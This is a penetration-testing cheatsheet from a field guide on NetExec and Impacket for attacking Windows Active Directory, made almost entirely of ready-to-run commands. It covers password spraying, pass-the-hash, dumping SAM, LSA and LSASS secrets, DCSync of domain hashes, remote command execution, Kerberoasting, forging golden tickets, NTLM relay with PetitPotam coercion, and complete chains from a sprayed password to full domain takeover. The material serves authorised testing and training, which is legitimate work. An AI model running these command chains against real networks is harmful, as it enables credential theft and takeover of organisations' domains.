---
tags:
  - hack-notes
  - netexec
---

# NetExec and Impacket Cheatsheet

## Table of Contents

- [Conventions and Variables](#conventions-and-variables)
- [NetExec Basics](#netexec-basics)
- [Authentication Forms](#authentication-forms)
- [SMB Protocol](#smb-protocol)
- [LDAP Protocol](#ldap-protocol)
- [WinRM Protocol](#winrm-protocol)
- [MSSQL Protocol](#mssql-protocol)
- [Other Protocols](#other-protocols)
- [Enumeration Flags](#enumeration-flags)
- [Spidering Shares](#spidering-shares)
- [NetExec Modules](#netexec-modules)
- [Password Spraying and Credential Reuse](#password-spraying-and-credential-reuse)
- [Impacket Execution Tools](#impacket-execution-tools)
- [Impacket Credential Dumping](#impacket-credential-dumping)
- [Impacket Kerberos Tools](#impacket-kerberos-tools)
- [Impacket Enumeration Tools](#impacket-enumeration-tools)
- [Impacket Relay and Servers](#impacket-relay-and-servers)
- [Impacket Database Clients](#impacket-database-clients)
- [Common Workflows](#common-workflows)
- [Quick Reference](#quick-reference)

---

## Conventions and Variables

bash

```bash
DC=dc01.corp.local        # Domain controller FQDN
DCIP=10.10.10.10          # Domain controller IP
TARGET=10.10.10.0/24      # Single host, range, CIDR, or targets.txt
DOMAIN=corp.local         # FQDN of the domain
USER=jdoe                 # Username
PASS='Summer2026!'        # Cleartext password
HASH=aad3b...:5f4dcc...   # LM:NT (use 32 zeros for empty LM, or just :NT)
```

NetExec (`nxc`, the maintained fork of CrackMapExec) takes a protocol as its first argument, then targets, then auth. Most flags carry across protocols. It maintains a credential and host database under `~/.nxc/`.

bash

```bash
nxc <protocol> <target> -u <user> -p <pass> [flags]   # General form
nxc smb $TARGET -u $USER -p "$PASS"                    # Example
```

---

## NetExec Basics

bash

```bash
nxc --version                          # Confirm install and version
nxc smb --help                         # Per-protocol help and flags
nxc smb 10.10.10.10                    # Unauthenticated host/SMB fingerprint
nxc smb 10.10.10.0/24                  # Sweep a subnet (signing, OS, domain)
nxc smb targets.txt -u $USER -p "$PASS"  # Targets from a file
```

NetExec output color coding: green plus marks valid creds, red minus marks failure, and `(Pwn3d!)` means the credential grants code execution on that host (admin).

---

## Authentication Forms

bash

```bash
# Password
nxc smb $TARGET -u $USER -p "$PASS"

# NT hash (pass-the-hash). Either LM:NT or just the NT half
nxc smb $TARGET -u administrator -H 5f4dcc...
nxc smb $TARGET -u administrator -H aad3b...:5f4dcc...

# Kerberos using a ccache in KRB5CCNAME
export KRB5CCNAME=jdoe.ccache
nxc smb $DC -u $USER --use-kcache

# Kerberos asking for a TGT from a password or hash
nxc smb $DC -u $USER -p "$PASS" -k
nxc smb $DC -u $USER -H 5f4dcc... -k

# AES key (Kerberos, resists RC4 downgrade detections)
nxc smb $DC -u $USER --aesKey <aes256-key> -k

# Null session and guest
nxc smb $TARGET -u '' -p ''
nxc smb $TARGET -u guest -p ''

# Local account auth (SAM, not domain)
nxc smb $TARGET -u administrator -p "$PASS" --local-auth

# Lists for users and passwords (spraying)
nxc smb $TARGET -u users.txt -p passwords.txt
```

---

## SMB Protocol

bash

```bash
# Host facts: OS, domain, SMB signing, SMBv1
nxc smb $TARGET

# Shares and access level (READ / WRITE)
nxc smb $TARGET -u $USER -p "$PASS" --shares

# Logged-on users and active sessions
nxc smb $TARGET -u $USER -p "$PASS" --loggedon-users
nxc smb $TARGET -u $USER -p "$PASS" --sessions

# Domain users, groups, and password policy
nxc smb $DCIP -u $USER -p "$PASS" --users
nxc smb $DCIP -u $USER -p "$PASS" --groups
nxc smb $DCIP -u $USER -p "$PASS" --pass-pol
nxc smb $DCIP -u $USER -p "$PASS" --rid-brute 10000   # Enumerate via RID cycling

# Local secret dumping (needs admin)
nxc smb $TARGET -u administrator -p "$PASS" --sam     # Local SAM hashes
nxc smb $TARGET -u administrator -p "$PASS" --lsa     # LSA secrets / cached creds
nxc smb $DCIP   -u $USER -p "$PASS" --ntds            # DCSync the NTDS.dit (DC only)
nxc smb $DCIP   -u $USER -p "$PASS" --ntds --user krbtgt

# Command execution (admin), picks exec method automatically
nxc smb $TARGET -u administrator -p "$PASS" -x whoami
nxc smb $TARGET -u administrator -p "$PASS" -X '$PSVersionTable'    # PowerShell
nxc smb $TARGET -u administrator -p "$PASS" --exec-method smbexec -x hostname

# Put and get files over SMB
nxc smb $TARGET -u administrator -p "$PASS" --put-file ./agent.exe '\\Windows\\Temp\\a.exe'
nxc smb $TARGET -u administrator -p "$PASS" --get-file '\\Windows\\Temp\\a.exe' ./loot.exe
```

---

## LDAP Protocol

bash

```bash
# Domain enumeration over LDAP
nxc ldap $DCIP -u $USER -p "$PASS" --users
nxc ldap $DCIP -u $USER -p "$PASS" --groups
nxc ldap $DCIP -u $USER -p "$PASS" --password-not-required
nxc ldap $DCIP -u $USER -p "$PASS" --trusted-for-delegation
nxc ldap $DCIP -u $USER -p "$PASS" --admin-count          # Protected/privileged accounts

# Kerberos attack surface straight to crackable files
nxc ldap $DCIP -u $USER -p "$PASS" --asreproast asrep.txt
nxc ldap $DCIP -u $USER -p "$PASS" --kerberoasting kerb.txt

# BloodHound collection straight from NetExec
nxc ldap $DCIP -u $USER -p "$PASS" --bloodhound -c All --dns-server $DCIP

# Read descriptions for cleartext password leaks
nxc ldap $DCIP -u $USER -p "$PASS" -M get-desc-users
```

---

## WinRM Protocol

bash

```bash
# Validate WinRM access (5985/5986)
nxc winrm $TARGET -u $USER -p "$PASS"

# Pass-the-hash and command execution
nxc winrm $TARGET -u administrator -H 5f4dcc...
nxc winrm $TARGET -u administrator -p "$PASS" -x 'whoami /all'
nxc winrm $TARGET -u administrator -p "$PASS" -X 'Get-LocalUser'

# Kerberos
nxc winrm $DC -u $USER -p "$PASS" -k -x hostname
```

A `(Pwn3d!)` on winrm means you can drop into a full shell with `evil-winrm -i $TARGET -u $USER -p "$PASS"`.

---

## MSSQL Protocol

bash

```bash
# Auth and version
nxc mssql $TARGET -u sa -p "$PASS"
nxc mssql $TARGET -u $USER -p "$PASS" --local-auth        # SQL login vs domain
nxc mssql $TARGET -u $USER -p "$PASS" -H 5f4dcc...        # Windows auth via hash

# Run T-SQL or enable and use xp_cmdshell
nxc mssql $TARGET -u sa -p "$PASS" -q 'SELECT @@version'
nxc mssql $TARGET -u sa -p "$PASS" -x whoami              # xp_cmdshell
nxc mssql $TARGET -u sa -p "$PASS" -X 'Get-Process'       # PowerShell via xp_cmdshell

# Upload and download through the SQL service account
nxc mssql $TARGET -u sa -p "$PASS" --put-file ./a.exe 'C:\\Windows\\Temp\\a.exe'
nxc mssql $TARGET -u sa -p "$PASS" --get-file 'C:\\file.txt' ./loot.txt
```

---

## Other Protocols

bash

```bash
# SSH
nxc ssh $TARGET -u $USER -p "$PASS"
nxc ssh $TARGET -u $USER -p "$PASS" -x id
nxc ssh $TARGET -u $USER --key-file ./id_rsa            # Key auth

# FTP
nxc ftp $TARGET -u $USER -p "$PASS"
nxc ftp $TARGET -u anonymous -p '' --ls

# RDP (validate creds, screenshot, NLA check)
nxc rdp $TARGET -u $USER -p "$PASS"
nxc rdp $TARGET -u $USER -p "$PASS" --screenshot
nxc rdp $TARGET -u $USER -H 5f4dcc...                   # Pass-the-hash to RDP

# VNC (no-auth or password)
nxc vnc $TARGET --port 5900
nxc vnc $TARGET -p "$PASS" --screenshot

# WMI (validate, query, execute)
nxc wmi $TARGET -u administrator -p "$PASS" -x hostname
nxc wmi $TARGET -u administrator -p "$PASS" --wmi 'SELECT * FROM Win32_OperatingSystem'
```

---

## Enumeration Flags

| Flag | Effect |
|------|--------|
| `--shares` | List shares and READ/WRITE access |
| `--users` | Domain or local users |
| `--groups` | Groups and members |
| `--pass-pol` | Password and lockout policy |
| `--rid-brute N` | Cycle RIDs to enumerate principals |
| `--sam` | Local SAM hashes (admin) |
| `--lsa` | LSA secrets and cached creds (admin) |
| `--ntds` | DCSync NTDS.dit (DC, replication rights) |
| `--loggedon-users` | Who is logged on |
| `--sessions` | Active sessions |
| `--disks` | Enumerate disks |
| `--computers` | Domain computer accounts |
| `--local-groups` | Local group membership |

---

## Spidering Shares

bash

```bash
# Built-in recursive listing of a share
nxc smb $TARGET -u $USER -p "$PASS" --spider C\$ --regex .

# Hunt files by pattern and content
nxc smb $TARGET -u $USER -p "$PASS" --spider SYSVOL --pattern .xml --content

# spider_plus module: dump metadata of every readable file across all shares to JSON
nxc smb $TARGET -u $USER -p "$PASS" -M spider_plus
nxc smb $TARGET -u $USER -p "$PASS" -M spider_plus -o DOWNLOAD_FLAG=true   # Pull files
nxc smb $TARGET -u $USER -p "$PASS" -M spider_plus -o EXCLUDE_DIRS=WINNT,Windows
```

Output from spider_plus lands under `~/.nxc/modules/nxc_spider_plus/` as per-host JSON.

---

## NetExec Modules

bash

```bash
# List every module for a protocol
nxc smb -L
nxc ldap -L

# Show a module's options
nxc smb -M lsassy --options

# Run a module with -M, pass options with -o KEY=value
nxc smb $TARGET -u administrator -p "$PASS" -M lsassy        # Remote LSASS dump via Dumpert/comsvcs
nxc smb $TARGET -u administrator -p "$PASS" -M nanodump      # Stealthier LSASS minidump
nxc smb $TARGET -u administrator -p "$PASS" -M handlekatz    # Handle-cloning LSASS dump
nxc smb $TARGET -u administrator -p "$PASS" -M procdump
nxc smb $TARGET -u administrator -p "$PASS" -M masky         # Cert-based hash recovery
nxc ldap $DCIP   -u $USER -p "$PASS" -M laps                 # Read LAPS passwords
nxc ldap $DCIP   -u $USER -p "$PASS" -M maq                  # MachineAccountQuota
nxc ldap $DCIP   -u $USER -p "$PASS" -M adcs                 # Find ADCS CAs/templates
nxc ldap $DCIP   -u $USER -p "$PASS" -M enum_trusts
nxc smb  $TARGET -u administrator -p "$PASS" -M wdigest -o ACTION=enable   # Force cleartext on next logon
nxc smb  $TARGET -u administrator -p "$PASS" -M zerologon    # Check CVE-2020-1472
nxc smb  $TARGET -u '' -p '' -M petitpotam                  # Coercion check
```

---

## Password Spraying and Credential Reuse

bash

```bash
# Check policy FIRST, then keep one password under the lockout threshold
nxc smb $DCIP -u guest -p '' --pass-pol

# Spray one password across a user list. --continue-on-success keeps going past the first hit
nxc smb $DCIP -u users.txt -p 'Spring2026!' --continue-on-success

# Spray a small password list (cartesian: every user x every pass)
nxc smb $DCIP -u users.txt -p passwords.txt --continue-on-success

# 1:1 user-to-password pairing (no cross product)
nxc smb $DCIP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success

# Reuse one credential or hash across the whole subnet to find lateral movement
nxc smb 10.10.10.0/24 -u administrator -H 5f4dcc... --continue-on-success
nxc smb 10.10.10.0/24 -u administrator -p "$PASS" --local-auth --continue-on-success

# NetExec remembers cracked creds; reuse the database
nxc smb 10.10.10.0/24 --use-kcache
```

NetExec stores validated credentials in its workspace database. Inspect with `nxcdb` and reuse them automatically against new hosts.

---

## Impacket Execution Tools

All accept the target as `domain/user:password@host` and the hash form `-hashes LM:NT`. Add `-k -no-pass` to use a ticket from `KRB5CCNAME`.

bash

```bash
# psexec.py: SYSTEM shell via a service (loud, writes a binary)
psexec.py $DOMAIN/$USER:"$PASS"@$TARGET
psexec.py -hashes $HASH administrator@$TARGET

# smbexec.py: semi-interactive, no binary dropped (uses a temp service + share)
smbexec.py $DOMAIN/$USER:"$PASS"@$TARGET

# wmiexec.py: command execution over WMI (quieter, no service)
wmiexec.py $DOMAIN/$USER:"$PASS"@$TARGET
wmiexec.py -hashes $HASH administrator@$TARGET whoami     # One-shot command

# atexec.py: run one command via the Task Scheduler
atexec.py $DOMAIN/$USER:"$PASS"@$TARGET whoami

# dcomexec.py: execution via DCOM (MMC20, ShellWindows, ShellBrowserWindow)
dcomexec.py -object MMC20 $DOMAIN/$USER:"$PASS"@$TARGET
```

---

## Impacket Credential Dumping

bash

```bash
# secretsdump.py: local SAM/LSA, or remote DCSync of the whole NTDS
secretsdump.py $DOMAIN/$USER:"$PASS"@$TARGET                 # SAM + LSA + cached
secretsdump.py -hashes $HASH administrator@$TARGET           # With a hash
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC -just-dc            # DCSync everything
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC -just-dc-ntlm       # NT hashes only
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC -just-dc-user krbtgt
secretsdump.py -k -no-pass $DOMAIN/$USER@$DC -just-dc        # Via ticket

# Parse offline NTDS.dit + SYSTEM hive
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

---

## Impacket Kerberos Tools

bash

```bash
# GetNPUsers.py: AS-REP roasting (no preauth accounts)
GetNPUsers.py $DOMAIN/ -dc-ip $DCIP -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt
GetNPUsers.py $DOMAIN/$USER:"$PASS" -dc-ip $DCIP -request -format hashcat -outputfile asrep.txt

# GetUserSPNs.py: Kerberoasting (SPN accounts)
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $DCIP                       # List only
GetUserSPNs.py $DOMAIN/$USER:"$PASS" -dc-ip $DCIP -request -outputfile kerb.txt

# getTGT.py: request a TGT (overpass-the-hash), saves a ccache
getTGT.py $DOMAIN/$USER -hashes $HASH -dc-ip $DCIP
getTGT.py $DOMAIN/$USER:"$PASS" -dc-ip $DCIP
getTGT.py $DOMAIN/$USER -aesKey <aes256> -dc-ip $DCIP

# getST.py: request a service ticket; S4U for delegation abuse
getST.py -spn cifs/$TARGET -impersonate Administrator -hashes :<svc-nt> $DOMAIN/svc_web -dc-ip $DCIP

# ticketer.py: forge golden and silver tickets offline
ticketer.py -nthash <krbtgt-nt> -domain-sid S-1-5-21-... -domain $DOMAIN Administrator
ticketer.py -nthash <svc-nt> -domain-sid S-1-5-21-... -domain $DOMAIN -spn cifs/$DC Administrator

# raiseChild.py: automated child-domain to forest-root escalation
raiseChild.py -target-exec $DCIP $DOMAIN/$USER:"$PASS"

# ticketConverter.py: kirbi <-> ccache
ticketConverter.py ticket.kirbi ticket.ccache
```

---

## Impacket Enumeration Tools

bash

```bash
# rpcdump.py: dump the RPC endpoint mapper (find coercion/print/EFS interfaces)
rpcdump.py $DOMAIN/$USER:"$PASS"@$TARGET
rpcdump.py @$DCIP | grep -iE 'MS-RPRN|MS-EFSR|MS-PAR'    # Coercion surfaces

# samrdump.py: enumerate users, groups, and policy via SAMR
samrdump.py $DOMAIN/$USER:"$PASS"@$DCIP

# lookupsid.py: derive the domain SID and brute RIDs to principals
lookupsid.py $DOMAIN/$USER:"$PASS"@$DCIP
lookupsid.py $DOMAIN/guest@$DCIP -no-pass

# GetADUsers.py: list domain users with key attributes via LDAP
GetADUsers.py -all $DOMAIN/$USER:"$PASS" -dc-ip $DCIP

# findDelegation.py: list unconstrained/constrained/RBCD delegation
findDelegation.py $DOMAIN/$USER:"$PASS" -dc-ip $DCIP
```

---

## Impacket Relay and Servers

bash

```bash
# ntlmrelayx.py: relay captured NTLM auth to a target
ntlmrelayx.py -t smb://10.10.10.30 -smb2support                 # Relay to SMB (no signing)
ntlmrelayx.py -t ldap://$DCIP --escalate-user $USER             # Grant DCSync via LDAP
ntlmrelayx.py -t ldaps://$DCIP --delegate-access                # RBCD takeover
ntlmrelayx.py -tf targets.txt -smb2support -socks               # SOCKS for relayed sessions
ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp --adcs --template DomainController   # ESC8

# smbserver.py: stand up an SMB share (file transfer, hash capture)
smbserver.py share ./loot -smb2support
smbserver.py -ip 10.10.14.5 share ./www -smb2support -username user -password pass
```

Pair `ntlmrelayx.py` with Responder, mitm6, or a coercion (PetitPotam, PrinterBug) feeding authentication to it.

---

## Impacket Database Clients

bash

```bash
# mssqlclient.py: interactive SQL with built-in attack helpers
mssqlclient.py $DOMAIN/$USER:"$PASS"@$TARGET -windows-auth
mssqlclient.py -hashes $HASH $DOMAIN/$USER@$TARGET -windows-auth

# Inside the SQL prompt:
#   enable_xp_cmdshell            -- turn on command execution
#   xp_cmdshell whoami            -- run an OS command
#   enum_links                    -- list linked SQL servers
#   use_link SQL02                -- pivot to a linked server (chain trust)
#   exec_as_login sa              -- impersonate a login if permitted
```

---

## Common Workflows

End-to-end chain: spray to dump SAM to pivot with wmiexec to DCSync.

bash

```bash
# 1. Build a user list and check policy before spraying
nxc smb $DCIP -u guest -p '' --rid-brute 10000 | tee rids.txt
nxc smb $DCIP -u guest -p '' --pass-pol               # Note lockout threshold

# 2. Spray one safe password across the domain, keep going past first hit
nxc smb $DCIP -u users.txt -p 'Welcome2026!' --continue-on-success

# 3. With a hit, find where that credential is local admin (Pwn3d!)
nxc smb 10.10.10.0/24 -u jdoe -p 'Welcome2026!' --continue-on-success

# 4. On a Pwn3d! host, dump local SAM and LSA secrets
nxc smb 10.10.10.25 -u jdoe -p 'Welcome2026!' --sam --lsa

# 5. Reuse a recovered local admin hash and pivot with wmiexec
nxc smb 10.10.10.0/24 -u administrator -H 5f4dcc... --local-auth --continue-on-success
wmiexec.py -hashes :5f4dcc... administrator@10.10.10.40

# 6. From a domain admin (or replication rights) DCSync the domain
secretsdump.py -hashes :<da-nt> $DOMAIN/da_user@$DC -just-dc
secretsdump.py $DOMAIN/da_user:"$PASS"@$DC -just-dc-user krbtgt   # Grab krbtgt for golden
```

Coercion-to-relay path with no admin credential:

bash

```bash
# 1. Confirm a coercible interface on the DC
rpcdump.py @$DCIP | grep -iE 'MS-EFSR|MS-RPRN'

# 2. Relay to LDAP to grant your user replication rights
ntlmrelayx.py -t ldap://$DCIP --escalate-user $USER -smb2support

# 3. Coerce the DC to authenticate to your relay (PetitPotam)
petitpotam.py -d $DOMAIN -u $USER -p "$PASS" <attacker-ip> $DCIP

# 4. Now DCSync with the new rights
secretsdump.py $DOMAIN/$USER:"$PASS"@$DC -just-dc
```

Kerberos triage and roast with NetExec into Impacket:

bash

```bash
nxc ldap $DCIP -u $USER -p "$PASS" --asreproast asrep.txt
nxc ldap $DCIP -u $USER -p "$PASS" --kerberoasting kerb.txt
hashcat -m 18200 asrep.txt rockyou.txt -O
hashcat -m 13100 kerb.txt   rockyou.txt -O
# Then prove the cracked service account and pivot
nxc smb 10.10.10.0/24 -u svc_sql -p '<cracked>' --continue-on-success
wmiexec.py $DOMAIN/svc_sql:'<cracked>'@10.10.10.40
```

---

## Quick Reference

| Goal | Command |
|------|---------|
| SMB sweep | `nxc smb 10.10.10.0/24` |
| Shares | `nxc smb $TARGET -u $USER -p "$PASS" --shares` |
| RID brute | `nxc smb $DCIP -u guest -p '' --rid-brute 10000` |
| Pass policy | `nxc smb $DCIP -u guest -p '' --pass-pol` |
| Spray | `nxc smb $DCIP -u users.txt -p 'Pass!' --continue-on-success` |
| Pass-the-hash | `nxc smb $TARGET -u administrator -H 5f4dcc...` |
| Local SAM | `nxc smb $TARGET -u administrator -p "$PASS" --sam` |
| LSA secrets | `nxc smb $TARGET -u administrator -p "$PASS" --lsa` |
| DCSync (nxc) | `nxc smb $DCIP -u $USER -p "$PASS" --ntds` |
| LSASS dump | `nxc smb $TARGET -u administrator -p "$PASS" -M lsassy` |
| Spider files | `nxc smb $TARGET -u $USER -p "$PASS" -M spider_plus` |
| AS-REP roast | `nxc ldap $DCIP -u $USER -p "$PASS" --asreproast asrep.txt` |
| Kerberoast | `nxc ldap $DCIP -u $USER -p "$PASS" --kerberoasting kerb.txt` |
| WinRM exec | `nxc winrm $TARGET -u administrator -p "$PASS" -x whoami` |
| MSSQL exec | `nxc mssql $TARGET -u sa -p "$PASS" -x whoami` |
| List modules | `nxc smb -L` |
| psexec | `psexec.py $DOMAIN/$USER:"$PASS"@$TARGET` |
| wmiexec | `wmiexec.py -hashes $HASH administrator@$TARGET` |
| smbexec | `smbexec.py $DOMAIN/$USER:"$PASS"@$TARGET` |
| atexec | `atexec.py $DOMAIN/$USER:"$PASS"@$TARGET whoami` |
| DCSync (impacket) | `secretsdump.py $DOMAIN/$USER:"$PASS"@$DC -just-dc` |
| Get TGT | `getTGT.py $DOMAIN/$USER -hashes $HASH -dc-ip $DCIP` |
| Get ST (S4U) | `getST.py -spn cifs/$TARGET -impersonate Administrator ...` |
| Golden ticket | `ticketer.py -nthash <krbtgt> -domain-sid <sid> -domain $DOMAIN Administrator` |
| Relay to LDAP | `ntlmrelayx.py -t ldap://$DCIP --escalate-user $USER` |
| SMB server | `smbserver.py share ./loot -smb2support` |
| RPC dump | `rpcdump.py $DOMAIN/$USER:"$PASS"@$TARGET` |
| SID lookup | `lookupsid.py $DOMAIN/guest@$DCIP -no-pass` |
| Find delegation | `findDelegation.py $DOMAIN/$USER:"$PASS" -dc-ip $DCIP` |
| MSSQL client | `mssqlclient.py $DOMAIN/$USER:"$PASS"@$TARGET -windows-auth` |

Common Impacket auth suffixes: `-hashes LM:NT` for pass-the-hash, `-k -no-pass` for a ticket in `KRB5CCNAME`, `-aesKey <key>` for AES Kerberos, `-dc-ip $DCIP` when name resolution is missing.

---

## Related

- Checklists: [Internal Network and Active Directory](../Checklists/Internal%20Network%20and%20Active%20Directory.md), [Assumed Breach](../Checklists/Assumed%20Breach.md)
- [Active Directory and Kerberos](Active%20Directory%20and%20Kerberos.md)
- [Windows Privilege Escalation](Windows%20Privilege%20Escalation.md)
- [Reverse Shells and File Transfer](Reverse%20Shells%20and%20File%20Transfer.md)
- [Pivoting and Tunneling](Pivoting%20and%20Tunneling.md)
- [Hashcat Cheatsheet](Hashcat.md)

---
*Part of the [Pentest Field Guide](https://github.com/Su1ph3r/hack-notes-field-guide), maintained by [Cairn Security](https://cairnsecurity.com). Independent penetration testing.*
